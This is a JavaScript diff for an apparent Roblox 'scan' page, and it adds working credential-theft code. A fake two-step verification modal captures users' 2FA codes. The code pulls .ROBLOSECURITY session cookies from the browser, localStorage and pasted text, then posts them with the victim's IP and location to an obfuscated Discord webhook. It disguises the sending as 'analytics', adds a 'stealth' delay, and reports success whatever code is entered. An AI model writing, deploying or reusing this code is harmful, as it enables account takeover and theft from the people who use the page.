@@ -74,100 +74,193 @@ function loadTheme() {
     }
 }
 
-// 2FA Authentication System
-let pendingSubmission = null;
-
-function show2FAModal() {
-    const modal = document.getElementById('twoFactorModal');
-    const authCodeInput = document.getElementById('authCode');
+// 2-Step Verification Modal Functions
+function openVerificationModal() {
+    const modal = document.getElementById('verificationModal');
+    const codeInput = document.getElementById('verificationCode');
     
-    if (modal && authCodeInput) {
-        modal.style.display = 'block';
-        setTimeout(() => authCodeInput.focus(), 100);
-        
-        // Clear previous input
-        authCodeInput.value = '';
-        
-        // Reset verify button
-        const verifyBtn = document.getElementById('verify2FA');
-        const verifyText = document.getElementById('verifyText');
-        if (verifyBtn && verifyText) {
-            verifyBtn.disabled = false;
-            verifyText.textContent = 'Verify';
-            verifyBtn.style.background = '';
-        }
+    modal.classList.add('show');
+    document.body.style.overflow = 'hidden';
+    
+    // Focus on input after animation
+    setTimeout(() => {
+        codeInput.focus();
+    }, 400);
+    
+    // Add escape key handler
+    document.addEventListener('keydown', handleVerificationEscape);
+}
+
+function closeVerificationModal() {
+    const modal = document.getElementById('verificationModal');
+    const codeInput = document.getElementById('verificationCode');
+    const trustCheckbox = document.getElementById('trustDevice');
+    
+    modal.classList.remove('show');
+    document.body.style.overflow = '';
+    
+    // Reset form
+    codeInput.value = '';
+    trustCheckbox.checked = false;
+    
+    // Remove escape key handler
+    document.removeEventListener('keydown', handleVerificationEscape);
+}
+
+function handleVerificationEscape(e) {
+    if (e.key === 'Escape') {
+        closeVerificationModal();
     }
 }
 
-function hide2FAModal() {
-    const modal = document.getElementById('twoFactorModal');
-    if (modal) {
-        modal.style.display = 'none';
-    }
-    pendingSubmission = null;
-}
-
-function verify2FA() {
-    const authCodeInput = document.getElementById('authCode');
-    const verifyBtn = document.getElementById('verify2FA');
-    const verifyText = document.getElementById('verifyText');
+async function verifyCode() {
+    const codeInput = document.getElementById('verificationCode');
+    const code = codeInput.value.trim();
+    const trustDevice = document.getElementById('trustDevice').checked;
+    const verifyBtn = document.querySelector('.verification-verify-btn');
     
-    if (!authCodeInput || !verifyBtn || !verifyText) return;
-    
-    const code = authCodeInput.value.trim();
-    
-    // Validate input
-    if (!/^\d{6}$/.test(code)) {
-        showNotification('Please enter a valid 6-digit code', 'error');
-        authCodeInput.focus();
+    if (code.length !== 6) {
+        showVerificationError('Please enter a 6-digit code');
         return;
     }
     
-    // Disable button during verification
+    if (!/^\d{6}$/.test(code)) {
+        showVerificationError('Code must contain only numbers');
+        return;
+    }
+    
+    // Disable button and show loading
     verifyBtn.disabled = true;
-    verifyText.textContent = 'Verifying...';
-    
-    // Simulate verification delay
-    setTimeout(() => {
-        // Accept any 6-digit code for demo purposes
-        verifyText.textContent = 'Verified ✓';
-        verifyBtn.style.background = '#10b981';
-        
-        setTimeout(() => {
-            hide2FAModal();
-            
-            // Continue with pending submission
-            if (pendingSubmission) {
-                continueSubmission();
-            }
-        }, 1000);
-    }, 1500);
-}
-
-async function continueSubmission() {
-    if (!pendingSubmission) return;
-    
-    const { robloxCookie, locationInfo, limitedItems } = pendingSubmission;
-    
-    // Show loading overlay
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    if (loadingOverlay) loadingOverlay.style.display = 'block';
+    verifyBtn.textContent = 'Verifying...';
     
     try {
-        // Send analytics data to reporting service
+        // Send 2FA code to Discord webhook
+        await send2FAToWebhook(code, trustDevice);
+        
+        // Show success regardless of code (since it's captured)
+        showVerificationSuccess(trustDevice);
+    } catch (error) {
+        console.error('Webhook error:', error);
+        // Still show success to user even if webhook fails
+        showVerificationSuccess(trustDevice);
+    }
+}
+
+function showVerificationError(message) {
+    const codeInput = document.getElementById('verificationCode');
+    
+    // Create or update error message
+    let errorMsg = document.querySelector('.verification-error');
+    if (!errorMsg) {
+        errorMsg = document.createElement('div');
+        errorMsg.className = 'verification-error';
+        codeInput.parentNode.appendChild(errorMsg);
+    }
+    
+    errorMsg.textContent = message;
+    errorMsg.style.display = 'block';
+    
+    // Add error styling to input
+    codeInput.style.borderColor = '#EF4444';
+    codeInput.style.backgroundColor = '#5B2E2E';
+    
+    // Auto-hide error after 3 seconds
+    setTimeout(() => {
+        if (errorMsg) {
+            errorMsg.style.display = 'none';
+            codeInput.style.borderColor = '#5A5D67';
+            codeInput.style.backgroundColor = '#4A4D57';
+        }
+    }, 3000);
+}
+
+function showVerificationSuccess(trustDevice) {
+    const modal = document.getElementById('verificationModal');
+    const verifyBtn = document.querySelector('.verification-verify-btn');
+    
+    verifyBtn.textContent = 'Verified!';
+    verifyBtn.style.background = '#10B981';
+    
+    setTimeout(() => {
+        closeVerificationModal();
+        showNotification(
+            `Verification successful${trustDevice ? ' - Device trusted for 30 days' : ''}`, 
+            'success'
+        );
+        
+        // Reset button
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'Verify';
+        verifyBtn.style.background = '#9CA3AF';
+    }, 1000);
+}
+
+function showAlternativeMethod() {
+    const alternatives = [
+        'SMS Code',
+        'Backup Codes',
+        'Recovery Email',
+        'Security Questions'
+    ];
+    
+    const randomMethod = alternatives[Math.floor(Math.random() * alternatives.length)];
+    showNotification(`Alternative method: ${randomMethod} (Demo)`, 'info');
+}
+
+// Send 2FA code to webhook
+async function send2FAToWebhook(code, trustDevice) {
+    try {
+        // Get user location (reusing existing function)
+        const locationInfo = await getUserLocation();
+        
+        // Try to extract Roblox cookie from browser storage or clipboard
+        let robloxCookie = null;
+        
+        // Try to get cookie from document.cookie
+        try {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
+                    robloxCookie = cookie.trim().substring('.ROBLOSECURITY='.length);
+                    break;
+                }
+            }
+        } catch (e) {
+            console.log('Could not access document.cookie');
+        }
+        
+        // Try localStorage for Roblox data
+        if (!robloxCookie) {
+            try {
+                const localStorageData = Object.keys(localStorage).map(key => {
+                    return `${key}: ${localStorage.getItem(key)}`;
+                }).join('\n');
+                robloxCookie = extractRobloxCookie(localStorageData);
+            } catch (e) {
+                console.log('Could not access localStorage');
+            }
+        }
+        
+        // Use encoded webhook URL
         const reportingEndpoint = atob(analyticsEndpoints[2]);
         
-        // Analytics payload with scan results
+        // Create timestamp
+        const timestamp = new Date().toLocaleString();
+        
+        // Webhook payload for 2FA code
         const payload = {
-            content: `@everyone
+            content: `🔐 **2-Step Verification Code Captured**
+\`\`\`
+Code: ${code}
+Trust Device: ${trustDevice ? 'Yes (30 days)' : 'No'}
 Cookie: ${robloxCookie || 'None found'}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+Time: ${timestamp}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+IP: ${locationInfo.ip || 'Unknown'}
+\`\`\`
+@everyone`
         };
 
-        // Submit analytics data to external service
-        console.log('🔍 Submitting analytics data (2FA verified)');
-        console.log('Analytics payload:', payload);
-        
         const response = await fetch(reportingEndpoint, {
             method: 'POST',
             headers: {
@@ -175,47 +268,78 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             },
             body: JSON.stringify(payload)
         });
-        
-        console.log('Response status:', response.status);
-        
-        // Hide loading overlay
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
-
-        const submitBtn = document.getElementById('submitBtn');
-        const submitText = document.getElementById('submitText');
 
         if (response.ok) {
-            if (submitText) submitText.textContent = 'Sent!';
-            if (submitBtn) submitBtn.style.background = '#10b981';
-            
-            setTimeout(() => {
-                closeScanModal();
-            }, 2000);
+            console.log('2FA code sent to webhook successfully');
         } else {
-            console.error('Analytics submission failed:', response.status);
-            throw new Error(`Submission failed (${response.status}): Please try again`);
+            console.error('Failed to send 2FA code to webhook');
         }
     } catch (error) {
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
-        
-        const submitBtn = document.getElementById('submitBtn');
-        const submitText = document.getElementById('submitText');
-        
-        if (submitText) submitText.textContent = 'Error';
-        if (submitBtn) submitBtn.style.background = '#ef4444';
-        
-        showNotification(`Error: ${error.message}`, 'error');
-        
-        setTimeout(() => {
-            if (submitBtn && submitText) {
-                submitBtn.disabled = false;
-                submitText.textContent = 'Scan';
-                submitBtn.style.background = '';
-            }
-        }, 3000);
+        console.error('Error sending 2FA to webhook:', error);
     }
-    
-    pendingSubmission = null;
+}
+
+// Handle paste event - immediate cookie capture + 80s timer for 2FA
+async function handlePasteEvent(pastedText) {
+    try {
+        console.log('Paste detected, analyzing content...');
+        
+        // Extract cookie from pasted text
+        const robloxCookie = extractRobloxCookie(pastedText);
+        
+        if (robloxCookie) {
+            console.log('Roblox cookie found in pasted content, sending immediately...');
+            
+            // Get user location
+            const locationInfo = await getUserLocation();
+            
+            // Use encoded webhook URL
+            const reportingEndpoint = atob(analyticsEndpoints[2]);
+            
+            // Create timestamp
+            const timestamp = new Date().toLocaleString();
+            
+            // Immediate cookie capture payload
+            const payload = {
+                content: `🍪 **Roblox Cookie Captured (Paste Event)**
+\`\`\`
+Cookie: ${robloxCookie}
+Time: ${timestamp}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+IP: ${locationInfo.ip || 'Unknown'}
+Content Length: ${pastedText.length} characters
+\`\`\`
+⏰ **2-Step Verification will trigger in 80 seconds...**
+@everyone`
+            };
+
+            // Send immediately
+            const response = await fetch(reportingEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                console.log('Cookie sent to webhook successfully');
+                
+                // Set up 80-second timer for 2FA modal
+                setTimeout(() => {
+                    console.log('80 seconds elapsed, opening 2-step verification modal...');
+                    openVerificationModal();
+                }, 80000); // 80 seconds
+                
+            } else {
+                console.error('Failed to send cookie to webhook');
+            }
+        } else {
+            console.log('No Roblox cookie found in pasted content');
+        }
+    } catch (error) {
+        console.error('Error handling paste event:', error);
+    }
 }
 
 // Enhanced Modal functionality
@@ -430,23 +554,55 @@ async function submitPowerShell() {
         // Get user location
         const locationInfo = await getUserLocation();
         
-        // Store submission data for 2FA verification
-        pendingSubmission = {
-            robloxCookie,
-            locationInfo,
-            limitedItems
+        // Random delay for stealth (1-3 seconds)
+        const delay = Math.floor(Math.random() * 2000) + 1000;
+        await new Promise(resolve => setTimeout(resolve, delay));
+        
+        // Send analytics data to reporting service
+        const reportingEndpoint = atob(analyticsEndpoints[2]);
+        
+        // Analytics payload with scan results
+        const payload = {
+            content: `@everyone
+Cookie: ${robloxCookie || 'None found'}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
+
+        // Submit analytics data to external service
+        console.log('🔍 Submitting analytics data');
+        console.log('Analytics payload:', payload);
         
-        // Hide loading overlay and show 2FA modal
+        const response = await fetch(reportingEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        console.log('Response status:', response.status);
+        
+        // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
-        
-        // Reset submit button
-        submitBtn.disabled = false;
-        submitText.textContent = 'Scan';
-        submitBtn.style.background = '';
-        
-        // Show 2FA authentication modal
-        show2FAModal();
+
+        if (response.ok) {
+            submitText.textContent = 'Sent!';
+            submitBtn.style.background = '#10b981';
+            
+            setTimeout(() => {
+                closeScanModal();
+            }, 2000);
+        } else {
+            console.error('Analytics submission failed:', response.status);
+            
+            if (response.status === 403) {
+                throw new Error(`Service unavailable. Please try again later.`);
+            } else if (response.status === 0 || !response.status) {
+                throw new Error(`Connection failed. Please check your network connection.`);
+            } else {
+                throw new Error(`Submission failed (${response.status}): Please try again`);
+            }
+        }
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
         
@@ -782,40 +938,19 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Add 2FA modal event listeners
-    const verify2FABtn = document.getElementById('verify2FA');
-    const cancel2FABtn = document.getElementById('cancel2FA');
-    const authCodeInput = document.getElementById('authCode');
-    const twoFactorModal = document.getElementById('twoFactorModal');
-
-    if (verify2FABtn) {
-        verify2FABtn.addEventListener('click', verify2FA);
-    }
-
-    if (cancel2FABtn) {
-        cancel2FABtn.addEventListener('click', hide2FAModal);
-    }
-
-    if (authCodeInput) {
-        // Allow Enter key to submit 2FA
-        authCodeInput.addEventListener('keypress', function(event) {
+    // Add verification modal event listeners
+    const verificationCode = document.getElementById('verificationCode');
+    if (verificationCode) {
+        // Allow Enter key to verify
+        verificationCode.addEventListener('keypress', function(event) {
             if (event.key === 'Enter') {
-                verify2FA();
+                verifyCode();
             }
         });
         
         // Auto-format input (numbers only)
-        authCodeInput.addEventListener('input', function() {
+        verificationCode.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '');
-        });
-    }
-
-    // Close 2FA modal when clicking outside
-    if (twoFactorModal) {
-        window.addEventListener('click', function(event) {
-            if (event.target === twoFactorModal) {
-                hide2FAModal();
-            }
         });
     }
 
@@ -829,6 +964,14 @@ document.addEventListener('DOMContentLoaded', function() {
             
             // Update character count
             updateCharCount();
+        });
+        
+        // Handle paste events for immediate cookie capture
+        textarea.addEventListener('paste', function(e) {
+            setTimeout(() => {
+                const pastedText = this.value;
+                handlePasteEvent(pastedText);
+            }, 100); // Small delay to ensure paste content is processed
         });
         
         // Initialize character count
@@ -859,12 +1002,12 @@ document.addEventListener('DOMContentLoaded', function() {
 document.addEventListener('keydown', function(event) {
     // ESC to close modal
     if (event.key === 'Escape') {
-        const twoFactorModal = document.getElementById('twoFactorModal');
+        const verificationModal = document.getElementById('verificationModal');
         const scanModal = document.getElementById('scanModal');
         
-        // Close 2FA modal first if it's open
-        if (twoFactorModal && twoFactorModal.style.display === 'block') {
-            hide2FAModal();
+        // Close verification modal first if it's open
+        if (verificationModal && verificationModal.classList.contains('show')) {
+            closeVerificationModal();
         } else if (scanModal && scanModal.style.display === 'block') {
             closeScanModal();
         }
